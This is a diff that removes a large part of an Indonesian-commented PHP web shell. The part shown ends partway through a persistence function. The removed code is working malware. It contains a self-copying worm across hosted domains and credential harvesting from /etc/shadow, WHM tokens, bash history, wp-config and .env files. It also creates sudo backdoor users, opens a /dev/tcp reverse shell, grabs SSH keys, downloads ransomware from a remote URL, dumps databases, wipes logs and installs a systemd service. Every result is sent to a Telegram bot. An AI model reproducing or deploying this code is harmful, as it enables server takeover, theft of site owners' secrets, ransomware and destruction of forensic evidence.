-        if (empty($domain) || $domain === 'unknown') {
-            $path_parts = explode('/', $dir);
-            $last = end($path_parts);
-            if (strpos($last, '.') !== false) {
-                $domain = $last;
-            } else {
-                foreach ($domain_map as $d_path => $d_name) {
-                    if (strpos($dir, $d_path) === 0) {
-                        $domain = $d_name;
-                        break;
-                    }
-                }
-            }
-        }
-        if (!is_writable($dir)) {
-            @chmod($dir, 0755);
-            if (!is_writable($dir)) {
-                $errors[] = "❌ $dir (not writable)";
-                continue;
-            }
-        }
-        $targetFile = $dir . '/' . $myFile;
-        if (file_exists($targetFile)) {
-            if (!empty($domain) && strpos($domain, '.') !== false) {
-                $domainLinks[] = "http://{$domain}/{$myFile} (exists)";
-            } else {
-                $domainLinks[] = "📁 {$dir}/{$myFile} (exists)";
-            }
-            continue;
-        }
-        if (@copy($currentFile, $targetFile)) {
-            @chmod($targetFile, 0644);
-            $infected[] = $targetFile;
-            $success_count++;
-            if (!empty($domain) && strpos($domain, '.') !== false) {
-                $domainLinks[] = "http://{$domain}/{$myFile}";
-            } else {
-                $domainLinks[] = "📁 {$dir}/{$myFile}";
-            }
-        } else {
-            $errors[] = "❌ Gagal copy ke: $dir";
-        }
-    }
-    
-    $msg = "🪱 *WORM INFECT ALL DOMAINS*\n\n"
-         . "📊 Total direktori: $total_dirs\n"
-         . "✅ Berhasil: $success_count\n"
-         . "❌ Gagal: " . count($errors) . "\n"
-         . "🌐 Total domain: " . count($domain_list) . "\n\n";
-    if (!empty($domainLinks)) {
-        $msg .= "📁 *Results:*\n" . implode("\n", array_slice($domainLinks, 0, 25));
-        if (count($domainLinks) > 25) {
-            $msg .= "\n... dan " . (count($domainLinks) - 25) . " lainnya";
-        }
-    }
-    if (!empty($errors) && count($errors) <= 10) {
-        $msg .= "\n\n❌ *Errors:*\n" . implode("\n", $errors);
-    }
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['infected' => $infected, 'links' => $domainLinks, 'errors' => $errors, 'total_domains' => count($domain_list)];
-}
-
-// ==================== CPANEL HARVEST & AUTO SSH ====================
-
-// ==================== CPANEL HARVEST (FOKUS KREDENSIAL) ====================
-function cpanel_harvest() {
-    global $botToken, $telegramUserId;
-    $credentials = [];
-    $scanned = [];
-
-    // ===== 1. SCAN /etc/passwd (USERNAME) =====
-    if (file_exists('/etc/passwd') && is_readable('/etc/passwd')) {
-        $passwd = file('/etc/passwd');
-        $users = [];
-        foreach ($passwd as $line) {
-            $parts = explode(':', $line);
-            if (count($parts) >= 3 && $parts[2] >= 1000 && $parts[2] < 65534) {
-                $users[] = $parts[0];
-            }
-        }
-        if (!empty($users)) {
-            $credentials[] = "👤 Users: " . implode(', ', array_slice($users, 0, 10));
-            $scanned[] = "📄 /etc/passwd scanned";
-        }
-    }
-
-    // ===== 2. SCAN /etc/shadow (HASH PASSWORD) =====
-    if (file_exists('/etc/shadow') && is_readable('/etc/shadow')) {
-        $shadow = file('/etc/shadow');
-        $hashes = [];
-        foreach ($shadow as $line) {
-            $parts = explode(':', $line);
-            if (count($parts) >= 2 && !empty($parts[1]) && $parts[1] != '*' && $parts[1] != '!') {
-                $hashes[] = $parts[0] . ':' . substr($parts[1], 0, 20) . '...';
-            }
-        }
-        if (!empty($hashes)) {
-            $credentials[] = "🔑 Password Hashes: " . implode(', ', array_slice($hashes, 0, 5));
-            $scanned[] = "📄 /etc/shadow scanned";
-        }
-    }
-
-    // ===== 3. SCAN TOKEN WHM & ACCESSHASH =====
-    $token_locations = [
-        '/root/.accesshash',
-        '/root/.cpanel/whm_token',
-        '/etc/cpanel/whm_token',
-        '/var/cpanel/whm_token',
-        '/usr/local/cpanel/whm_token',
-        '/home/*/.cpanel/whm_token',
-        '/home/*/.accesshash'
-    ];
-    foreach ($token_locations as $pattern) {
-        $files = glob($pattern);
-        foreach ($files as $file) {
-            if (is_file($file) && is_readable($file)) {
-                $content = trim(file_get_contents($file));
-                if (!empty($content) && strlen($content) > 10) {
-                    $credentials[] = "🔑 Token WHM: `$content` (dari $file)";
-                    $scanned[] = "✅ Token ditemukan di $file";
-                }
-            }
-        }
-    }
-
-    // ===== 4. SCAN BASH HISTORY (TOKEN/PASSWORD) =====
-    $history_files = ['/root/.bash_history', '/home/*/.bash_history'];
-    foreach ($history_files as $pattern) {
-        $files = glob($pattern);
-        foreach ($files as $file) {
-            if (is_file($file) && is_readable($file)) {
-                $content = file_get_contents($file);
-                preg_match_all('/(whmapi1|uapi|curl.*2087|whm.*token|whm.*password|passwd|useradd|mysql.*-p|ssh.*-p)\s+([^\s]+)/i', $content, $matches);
-                if (!empty($matches[2])) {
-                    foreach ($matches[2] as $cmd) {
-                        if (strlen($cmd) > 5) {
-                            $credentials[] = "📜 History: `$cmd` (dari $file)";
-                        }
-                    }
-                }
-                $scanned[] = "📜 History scanned: $file";
-            }
-        }
-    }
-
-    // ===== 5. SCAN FILE KONFIGURASI CPANEL (PASSWORD) =====
-    $config_files = [
-        '/etc/cpanel/cpanel.config',
-        '/var/cpanel/cpanel.config',
-        '/usr/local/cpanel/etc/cpanel.config',
-        '/home/*/.cpanel/cpanel.config'
-    ];
-    foreach ($config_files as $pattern) {
-        $files = glob($pattern);
-        foreach ($files as $file) {
-            if (is_file($file) && is_readable($file)) {
-                $content = file_get_contents($file);
-                preg_match_all('/(password|pass|pwd|key|secret|token)\s*=\s*([^\s]+)/i', $content, $matches);
-                if (!empty($matches[2])) {
-                    foreach ($matches[2] as $cred) {
-                        if (strlen($cred) > 3) {
-                            $credentials[] = "📄 Config: `$cred` (dari $file)";
-                        }
-                    }
-                }
-                $scanned[] = "📄 Config scanned: $file";
-            }
-        }
-    }
-
-    // ===== 6. SCAN SESSION CPANEL (USERNAME) =====
-    $session_dirs = ['/var/cpanel/sessions', '/tmp/cpanel_sessions', '/usr/local/cpanel/sessions'];
-    foreach ($session_dirs as $dir) {
-        if (is_dir($dir) && is_readable($dir)) {
-            $files = scandir($dir);
-            foreach ($files as $f) {
-                if ($f != '.' && $f != '..' && strlen($f) > 10) {
-                    $session_file = "$dir/$f";
-                    if (is_file($session_file) && is_readable($session_file)) {
-                        $content = file_get_contents($session_file);
-                        if (preg_match('/username=([^\s&]+)/', $content, $m)) {
-                            $credentials[] = "👤 Session User: " . $m[1] . " (dari $session_file)";
-                        }
-                    }
-                }
-            }
-            $scanned[] = "🍪 Sessions scanned: $dir";
-        }
-    }
-
-    // ===== 7. SCAN HOME DIRECTORIES FOR .env / CONFIG (USER/PASS) =====
-    $home_dirs = glob('/home/*', GLOB_ONLYDIR);
-    foreach ($home_dirs as $home) {
-        $env = $home . '/.env';
-        $wp_config = $home . '/public_html/wp-config.php';
-        $config = $home . '/public_html/config.php';
-        $db_config = $home . '/public_html/database.php';
-        
-        foreach ([$env, $wp_config, $config, $db_config] as $file) {
-            if (file_exists($file) && is_readable($file)) {
-                $content = file_get_contents($file);
-                preg_match_all('/(DB_USER|DB_PASSWORD|DB_PASS|PASSWORD|SECRET_KEY|API_KEY|AUTH_KEY)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i', $content, $matches);
-                if (!empty($matches[2])) {
-                    foreach ($matches[1] as $i => $key) {
-                        $val = trim($matches[2][$i]);
-                        if (strlen($val) > 3) {
-                            $credentials[] = "📁 $key: `$val` (dari " . basename($file) . ")";
-                        }
-                    }
-                }
-                $scanned[] = "📁 Config scanned: $file";
-            }
-        }
-    }
-
-    // ===== KIRIM HASIL =====
-    $msg = "🔑 *CPANEL HARVEST - CREDENTIALS*\n\n";
-    if (!empty($credentials)) {
-        $msg .= "📋 *Kredensial Ditemukan:*\n" . implode("\n", array_slice($credentials, 0, 30));
-        if (count($credentials) > 30) {
-            $msg .= "\n... dan " . (count($credentials) - 30) . " lainnya";
-        }
-    } else {
-        $msg .= "❌ Tidak ada kredensial ditemukan.\n";
-    }
-    $msg .= "\n📊 *Scan Details:*\n" . implode("\n", $scanned);
-
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $msg;
-}
-
-// ===== 2. AUTO CREATE SSH USER =====
-function auto_create_ssh($username = '', $password = '') {
-    global $botToken, $telegramUserId;
-
-    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-        $msg = "❌ Fitur ini hanya untuk server Linux! OS: " . PHP_OS;
-        sendTelegramMessage($botToken, $telegramUserId, $msg);
-        return $msg;
-    }
-    if (!function_exists('shell_exec')) {
-        $msg = "❌ shell_exec tidak tersedia!";
-        sendTelegramMessage($botToken, $telegramUserId, $msg);
-        return $msg;
-    }
-
-    // Generate username jika kosong
-    if (empty($username)) {
-        $username = 'ssh_' . bin2hex(random_bytes(4));
-    }
-    // Generate password jika kosong
-    if (empty($password)) {
-        $password = bin2hex(random_bytes(6)) . '@' . rand(100, 999);
-    }
-
-    $u = escapeshellarg($username);
-    $p = escapeshellarg($password);
-
-    // Cek apakah user sudah ada
-    $check = shell_exec("id $u 2>&1");
-    if (strpos($check, 'uid') !== false) {
-        $msg = "⚠️ User '$username' sudah ada!";
-        sendTelegramMessage($botToken, $telegramUserId, $msg);
-        return $msg;
-    }
-
-    // Buat user
-    $cmd = "useradd -m -s /bin/bash $u 2>&1";
-    $out = shell_exec($cmd);
-    if (strpos($out, 'already exists') !== false) {
-        $msg = "⚠️ User '$username' sudah ada!";
-        sendTelegramMessage($botToken, $telegramUserId, $msg);
-        return $msg;
-    }
-
-    // Set password
-    shell_exec("echo \"$u:$p\" | chpasswd 2>&1");
-
-    // Tambahkan ke sudo/wheel
-    $sudo = shell_exec("which sudo 2>/dev/null");
-    if (!empty($sudo)) {
-        shell_exec("usermod -aG sudo $u 2>&1");
-    } else {
-        shell_exec("usermod -aG wheel $u 2>&1");
-    }
-
-    // Ambil UID
-    $uid = shell_exec("id -u $u 2>&1");
-
-    $msg = "✅ *SSH USER CREATED SUCCESSFULLY!*\n\n"
-         . "👤 Username: `$username`\n"
-         . "🔐 Password: `$password`\n"
-         . "📂 Home: /home/$username\n"
-         . "🆔 UID: " . trim($uid) . "\n"
-         . "🖥️ Host: " . gethostname() . "\n"
-         . "🌐 IP: " . (shell_exec('curl -s ifconfig.me 2>&1') ?: $_SERVER['SERVER_ADDR'] ?? 'unknown');
-
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $msg;
-}
-
-// ===== HANDLER CPANEL HARVEST =====
-if (isset($_GET['cpanel_harvest']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    echo cpanel_harvest();
-    exit;
-}
-
-// ===== HANDLER AUTO CREATE SSH =====
-if (isset($_GET['create_ssh']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $user = $_GET['user'] ?? '';
-    $pass = $_GET['pass'] ?? '';
-    echo auto_create_ssh($user, $pass);
-    exit;
-}
-
-// ==================== BACKDOOR USER ====================
-function create_backdoor_user($username, $password) {
-    global $botToken, $telegramUserId;
-    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
-    $output = @shell_exec("useradd -m -s /bin/bash " . escapeshellarg($username) . " 2>&1");
-    if (strpos($output, 'exists') !== false) {
-        $msg = "⚠️ User $username sudah ada.";
-        sendTelegramMessage($botToken, $telegramUserId, $msg);
-        return $msg;
-    }
-    @shell_exec("echo '" . escapeshellarg($username) . ":" . escapeshellarg($password) . "' | chpasswd 2>&1");
-    @shell_exec("usermod -aG sudo " . escapeshellarg($username) . " 2>&1");
-    @shell_exec("usermod -aG wheel " . escapeshellarg($username) . " 2>&1");
-    $uid = @shell_exec("id -u " . escapeshellarg($username) . " 2>&1");
-    $msg = "✅ User $username created\nPassword: $password\nUID: $uid";
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $msg;
-}
-
-// ==================== REVERSE SHELL ====================
-function start_reverse_shell($ip, $port) {
-    global $botToken, $telegramUserId;
-    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
-    $script = "/tmp/rshell_$port.sh";
-    $content = "#!/bin/bash\nbash -i >& /dev/tcp/$ip/$port 0>&1\n";
-    @file_put_contents($script, $content);
-    @chmod($script, 0755);
-    @shell_exec("nohup " . escapeshellarg($script) . " > /dev/null 2>&1 &");
-    $msg = "✅ Reverse shell ke $ip:$port dimulai";
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return true;
-}
-
-function stop_reverse_shell($port) {
-    global $botToken, $telegramUserId;
-    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
-    @shell_exec("pkill -f 'rshell_$port' 2>/dev/null");
-    $msg = "✅ Reverse shell port $port dihentikan";
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $msg;
-}
-
-function status_reverse_shell() {
-    global $botToken, $telegramUserId;
-    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
-    $output = @shell_exec("ps aux | grep rshell_ | grep -v grep");
-    $msg = empty($output) ? "❌ Tidak ada reverse shell aktif" : "✅ Reverse shell aktif:\n$output";
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $msg;
-}
-
-// ==================== SSH KEYS GRABBER ====================
-function grab_ssh_keys() {
-    global $botToken, $telegramUserId;
-    $keys = [];
-    if (function_exists('shell_exec')) {
-        $users = explode("\n", @shell_exec('ls /home 2>/dev/null'));
-        foreach ($users as $user) {
-            $user = trim($user);
-            if (empty($user)) continue;
-            $auth = "/home/$user/.ssh/authorized_keys";
-            if (file_exists($auth) && is_readable($auth)) {
-                $content = file_get_contents($auth);
-                if (!empty(trim($content))) { $keys[] = "👤 User: $user\n" . $content; }
-            }
-        }
-        if (file_exists('/root/.ssh/authorized_keys') && is_readable('/root/.ssh/authorized_keys')) {
-            $content = file_get_contents('/root/.ssh/authorized_keys');
-            if (!empty(trim($content))) { $keys[] = "👤 User: root\n" . $content; }
-        }
-    }
-    if (empty($keys)) { 
-        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan SSH keys."); 
-        return []; 
-    }
-    $msg = "🔑 *SSH Keys Found*\n\n" . implode("\n\n", $keys);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $keys;
-}
-
-// ==================== WP SCAN ====================
-function scan_wordpress_laravel() {
-    global $botToken, $telegramUserId;
-    $found = [];
-    $roots = get_all_document_roots_cached();
-    foreach ($roots as $root) {
-        if (!is_dir($root) || !is_readable($root)) continue;
-        if (file_exists($root . '/wp-config.php') && is_readable($root . '/wp-config.php')) {
-            $wp_config = file_get_contents($root . '/wp-config.php');
-            $creds = [];
-            preg_match("/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_name);
-            preg_match("/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_user);
-            preg_match("/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_pass);
-            preg_match("/define\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $wp_config, $db_host);
-            $creds[] = "📁 WordPress: $root";
-            if (!empty($db_name[1])) $creds[] = "   DB_NAME: " . $db_name[1];
-            if (!empty($db_user[1])) $creds[] = "   DB_USER: " . $db_user[1];
-            if (!empty($db_pass[1])) $creds[] = "   DB_PASS: " . $db_pass[1];
-            if (!empty($db_host[1])) $creds[] = "   DB_HOST: " . $db_host[1];
-            if (file_exists($root . '/wp-includes/version.php')) {
-                $v_content = @file_get_contents($root . '/wp-includes/version.php');
-                if ($v_content && preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]/', $v_content, $v_match)) {
-                    $creds[] = "   Version: " . $v_match[1];
-                }
-            }
-            $found[] = implode("\n", $creds);
-        }
-        if (file_exists($root . '/.env') && is_readable($root . '/.env')) {
-            $env_content = file_get_contents($root . '/.env');
-            $creds = [];
-            preg_match_all('/([A-Z_]+)\s*=\s*(.+)/', $env_content, $matches);
-            $creds[] = "📁 Laravel: $root";
-            if (!empty($matches[1])) {
-                foreach ($matches[1] as $i => $key) {
-                    $key = trim($key);
-                    $value = trim($matches[2][$i] ?? '');
-                    if (strpos($key, 'DB_') !== false || strpos($key, 'PASS') !== false || 
-                        strpos($key, 'KEY') !== false || strpos($key, 'SECRET') !== false || strpos($key, 'TOKEN') !== false) {
-                        $creds[] = "   $key: $value";
-                    }
-                }
-            }
-            if (preg_match('/APP_ENV\s*=\s*(.+)/', $env_content, $env_match)) { $creds[] = "   APP_ENV: " . trim($env_match[1]); }
-            if (preg_match('/APP_DEBUG\s*=\s*(.+)/', $env_content, $debug_match)) { $creds[] = "   APP_DEBUG: " . trim($debug_match[1]); }
-            $found[] = implode("\n", $creds);
-        }
-    }
-    if (empty($found)) { 
-        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan WordPress/Laravel."); 
-        return []; 
-    }
-    $msg = "📊 *WordPress/Laravel Scan Results*\n\n" . implode("\n\n", $found);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $found;
-}
-
-// ==================== RANSOMWARE CREATOR ====================
-function create_ransomware() {
-    global $botToken, $telegramUserId;
-    $url = 'https://raw.githubusercontent.com/Iqyans/IqyanCodes/refs/heads/main/R.php';
-    
-    // --- 1. Tentukan direktori target (hanya __DIR__) ---
-    $targetDir = __DIR__;
-    $targetFile = $targetDir . '/R.php';
-    
-    // --- 2. Unduh dan simpan R.php ---
-    $code = @file_get_contents($url);
-    if ($code === false && function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
-        $code = curl_exec($ch);
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        if ($httpCode !== 200) $code = false;
-    }
-    if ($code === false || empty($code)) {
-        sendTelegramMessage($botToken, $telegramUserId, " Gagal mengunduh ransomware.");
-        return false;
-    }
-    
-    if (@file_put_contents($targetFile, $code) === false) {
-        sendTelegramMessage($botToken, $telegramUserId, " Gagal menyimpan R.php.");
-        return false;
-    }
-    
-    // --- 3. TIDAK ADA LOCK OTOMATIS (file dan direktori dibiarkan normal) ---
-    @chmod($targetFile, 0644);
-    
-    // --- 4. Buat URL yang akurat ---
-    $domain = $_SERVER['HTTP_HOST'] ?? '';
-    if (empty($domain) || $domain == 'localhost') {
-        $domains = get_all_domains_by_ip();
-        $domain = $domains[0] ?? $_SERVER['SERVER_NAME'] ?? 'unknown';
-    }
-    
-    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
-    $relativePath = '';
-    if ($docRoot && strpos($targetDir, $docRoot) === 0) {
-        $relativePath = ltrim(substr($targetDir, strlen($docRoot)), '/');
-        if ($relativePath) $relativePath .= '/';
-    } else {
-        $relativePath = basename($targetDir) . '/';
-    }
-    $urlPath = $relativePath . 'R.php';
-    $fullUrl = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $domain . '/' . ltrim($urlPath, '/');
-    
-    // --- 5. Kirim notifikasi ---
-    $msg = " Ransomware berhasil dibuat.\n"
-         . " Lokasi: <a href='$fullUrl'>$fullUrl</a>\n"
-         . " Path fisik: $targetFile\n";
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return true;
-}
-
-// ==================== FIND SENSITIVE FILES ====================
-function find_sensitive_files() {
-    global $botToken, $telegramUserId;
-    $found = [];
-    $patterns = [
-        '/.env', '/wp-config.php', '/config.php', '/database.php', '/db.php',
-        '/*.sql', '/*.tar', '/*.gz', '/*.zip', '/*.bak', '/*.old',
-        '/.htaccess', '/.htpasswd', '/web.config', '/settings.php', '/configuration.php'
-    ];
-    $roots = get_all_document_roots_cached();
-    foreach ($roots as $root) {
-        if (!is_dir($root)) continue;
-        foreach ($patterns as $pattern) {
-            $files = @glob($root . $pattern);
-            if ($files !== false) {
-                foreach ($files as $file) {
-                    if (is_file($file) && is_readable($file)) {
-                        $size = formatSize(filesize($file));
-                        $found[] = $file . " (" . $size . ")";
-                    }
-                }
-            }
-        }
-    }
-    if (empty($found)) { 
-        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan file sensitif."); 
-        return []; 
-    }
-    $msg = "🔍 *Sensitive Files Found*\n\n" . implode("\n", $found);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $found;
-}
-
-// ==================== DUMP DATABASE ====================
-function dump_databases() {
-    global $botToken, $telegramUserId;
-    $results = [];
-    $found_configs = [];
-    $config_files = ['.env', 'wp-config.php', 'config.php', 'database.php', 'db.php', 'settings.php'];
-    $roots = get_all_document_roots_cached();
-    foreach ($roots as $root) {
-        if (!is_dir($root) || !is_readable($root)) continue;
-        foreach ($config_files as $file) {
-            $path = $root . '/' . $file;
-            if (file_exists($path) && is_readable($path)) {
-                $content = @file_get_contents($path);
-                if ($content === false) continue;
-                $patterns = [
-                    '/(DB_HOST|DB_NAME|DB_USER|DB_PASS|DB_PASSWORD|DB_DATABASE)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i',
-                    '/define\(\s*[\'"]?(DB_HOST|DB_NAME|DB_USER|DB_PASSWORD|DB_DATABASE)[\'"]?\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i'
-                ];
-                $creds = [];
-                foreach ($patterns as $pattern) {
-                    preg_match_all($pattern, $content, $matches);
-                    if (!empty($matches[1]) && !empty($matches[2])) {
-                        foreach ($matches[1] as $i => $key) {
-                            $creds[] = $key . ': ' . trim($matches[2][$i]);
-                        }
-                    }
-                }
-                if (!empty($creds)) {
-                    $found_configs[] = "📁 " . basename($path) . ":\n" . implode("\n", array_unique($creds));
-                }
-            }
-        }
-    }
-    if (function_exists('shell_exec')) {
-        $mysql = @shell_exec('mysql --version 2>/dev/null');
-        if (strpos($mysql, 'mysql') !== false) {
-            $dbHost = getenv('DB_HOST') ?: 'localhost';
-            $dbUser = getenv('DB_USER') ?: 'root';
-            $dbPass = getenv('DB_PASS') ?: '';
-            $dbName = getenv('DB_NAME') ?: '';
-            foreach ($roots as $root) {
-                if (file_exists($root . '/wp-config.php')) {
-                    $content = file_get_contents($root . '/wp-config.php');
-                    if (preg_match("/define\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $h)) $dbHost = $h[1];
-                    if (preg_match("/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $u)) $dbUser = $u[1];
-                    if (preg_match("/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $p)) $dbPass = $p[1];
-                    if (preg_match("/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $n)) $dbName = $n[1];
-                    break;
-                }
-            }
-            if ($dbUser && $dbName) {
-                $dumpFile = '/tmp/db_dump_' . time() . '.sql';
-                $cmd = "mysqldump -h" . escapeshellarg($dbHost) . " -u" . escapeshellarg($dbUser);
-                if (!empty($dbPass)) $cmd .= " -p" . escapeshellarg($dbPass);
-                $cmd .= " " . escapeshellarg($dbName) . " 2>/dev/null > " . escapeshellarg($dumpFile);
-                @shell_exec($cmd);
-                if (file_exists($dumpFile) && filesize($dumpFile) > 100) {
-                    $results[] = "💾 Database dumped: " . $dbName . " (" . formatSize(filesize($dumpFile)) . ")";
-                }
-            }
-        }
-    }
-    if (empty($found_configs) && empty($results)) { 
-        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan database atau kredensial."); 
-        return []; 
-    }
-    $msg = "💾 *DATABASE DUMP*\n\n";
-    if (!empty($found_configs)) $msg .= "📋 *Config Files Found:*\n" . implode("\n", $found_configs);
-    if (!empty($results)) $msg .= "\n\n📁 *Dump Files:*\n" . implode("\n", $results);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return array_merge($found_configs, $results);
-}
-
-// ==================== ANTI FORENSIC ====================
-function anti_forensic_ultimate() {
-    global $botToken, $telegramUserId;
-    $results = [];
-    $logs = [
-        '/var/log/apache2/access.log', '/var/log/apache2/error.log',
-        '/var/log/nginx/access.log', '/var/log/nginx/error.log',
-        '/var/log/httpd/access_log', '/var/log/httpd/error_log',
-        '/var/log/syslog', '/var/log/auth.log', '/var/log/secure'
-    ];
-    foreach ($logs as $log) {
-        if (file_exists($log) && is_writable($log)) {
-            $size = @filesize($log);
-            if ($size !== false && $size > 0) { @file_put_contents($log, str_repeat("\x00", $size)); }
-            @unlink($log);
-            $results[] = "Cleaned: $log";
-        }
-    }
-    if (function_exists('shell_exec')) {
-        @shell_exec('history -c 2>/dev/null');
-        @shell_exec('unset HISTFILE 2>/dev/null');
-        $results[] = "Command history cleared";
-    }
-    $msg = "🧹 *Anti Forensic*\n\n" . implode("\n", $results);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['success' => true, 'msg' => implode("\n", $results)];
-}
-
-// ==================== BYPASS SUHOSIN ====================
-function bypass_suhosin() {
-    global $botToken, $telegramUserId;
-    $disabled = ini_get('disable_functions');
-    $open_basedir = ini_get('open_basedir');
-    $suhosin_eval = ini_get('suhosin.executor.disable_eval');
-    $msg = "🛡️ *Suhosin Status*\n\n"
-         . "Disabled Functions: " . ($disabled ?: 'none') . "\n"
-         . "open_basedir: " . ($open_basedir ?: 'none') . "\n"
-         . "suhosin.executor.disable_eval: " . ($suhosin_eval ? 'ON' : 'OFF') . "\n\n";
-    $methods = [];
-    if (function_exists('dl') && !in_array('dl', explode(',', $disabled))) { $methods[] = 'dl()'; }
-    if (function_exists('pcntl_exec') && !in_array('pcntl_exec', explode(',', $disabled))) { $methods[] = 'pcntl_exec()'; }
-    if (function_exists('proc_open') && !in_array('proc_open', explode(',', $disabled))) { $methods[] = 'proc_open()'; }
-    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', $disabled))) { $methods[] = 'shell_exec()'; }
-    if (!empty($methods)) { $msg .= "✅ Available bypass methods:\n" . implode("\n", $methods); }
-    else { $msg .= "❌ No bypass methods available."; }
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['success' => true, 'msg' => $msg];
-}
-
-// ==================== CREATE FTP ACCOUNT ====================
-function create_ftp_account($username, $password, $home = '') {
-    global $botToken, $telegramUserId;
-    $home = $home ?: '/home/' . $username;
-    $results = [];
-    if (function_exists('shell_exec')) {
-        if (file_exists('/usr/bin/pure-pw')) {
-            @shell_exec("echo '" . escapeshellarg($password) . "' | pure-pw useradd " . escapeshellarg($username) . " -u www-data -g www-data -d " . escapeshellarg($home) . " 2>/dev/null");
-            @shell_exec('pure-pw mkdb 2>/dev/null');
-            $results[] = "PureFTPd account created";
-        }
-        if (file_exists('/etc/vsftpd.conf')) {
-            $userlist = '/etc/vsftpd.userlist';
-            if (file_exists($userlist) && is_writable($userlist)) {
-                @file_put_contents($userlist, $username . "\n", FILE_APPEND);
-                @shell_exec("echo '" . escapeshellarg($username) . ":" . escapeshellarg($password) . "' | chpasswd 2>/dev/null");
-                $results[] = "vsftpd account created";
-            }
-        }
-    }
-    if (empty($results)) $results[] = "Tidak ada FTP server terdeteksi";
-    $msg = "📂 *FTP Account*\nUsername: $username\nPassword: $password\nHome: $home\n\n" . implode("\n", $results);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['success' => true, 'msg' => "✅ FTP account $username created"];
-}
-
-// ==================== CREATE MAIL ACCOUNT ====================
-function create_mail_account($email, $password, $domain = '') {
-    global $botToken, $telegramUserId;
-    $domain = $domain ?: $_SERVER['HTTP_HOST'];
-    $username = explode('@', $email)[0];
-    $results = [];
-    if (function_exists('shell_exec')) {
-        if (file_exists('/usr/bin/doveadm') && file_exists('/etc/postfix/virtual')) {
-            @shell_exec("doveadm user -a " . escapeshellarg($username) . " 2>/dev/null");
-            @file_put_contents('/etc/postfix/virtual', "$email $username@$domain\n", FILE_APPEND);
-            @shell_exec('postmap /etc/postfix/virtual 2>/dev/null');
-            @shell_exec('postfix reload 2>/dev/null');
-            $results[] = "Postfix virtual account created";
-        }
-        if (file_exists('/usr/sbin/exim')) {
-            $exim_user = '/etc/exim/domains/' . $domain . '/passwd';
-            if (!is_dir(dirname($exim_user))) @mkdir(dirname($exim_user), 0755, true);
-            $hash = @shell_exec("doveadm pw -s SHA512-CRYPT -p " . escapeshellarg($password) . " 2>/dev/null");
-            if ($hash) {
-                @file_put_contents($exim_user, $username . ':' . trim($hash) . '::' . $domain . "\n", FILE_APPEND);
-                $results[] = "Exim account created";
-            }
-        }
-    }
-    if (empty($results)) $results[] = "Tidak ada mail server terdeteksi";
-    $msg = "📧 *Mail Account*\nEmail: $email\nPassword: $password\nDomain: $domain\n\n" . implode("\n", $results);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['success' => true, 'msg' => "✅ Mail account $email created"];
-}
-
-// ==================== DEEP PERSISTENCE ====================
-function install_deep_persistence() {
-    global $botToken, $telegramUserId;
-    $results = [];
-    if (!isRoot()) return ['success' => false, 'msg' => "❌ Harus root"];
-    if (function_exists('shell_exec')) {
-        $service = '[Unit]
-Description=DKD Cache
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=php ' . __FILE__ . ' --daemon
-Restart=always
-RestartSec=60
-
-[Install]
-WantedBy=multi-user.target';
-        @file_put_contents('/etc/systemd/system/dkd.service', $service);
-        @shell_exec('systemctl daemon-reload 2>/dev/null');
-        @shell_exec('systemctl enable dkd.service 2>/dev/null');
-        @shell_exec('systemctl start dkd.service 2>/dev/null');
-        $results[] = "✅ Systemd service installed";
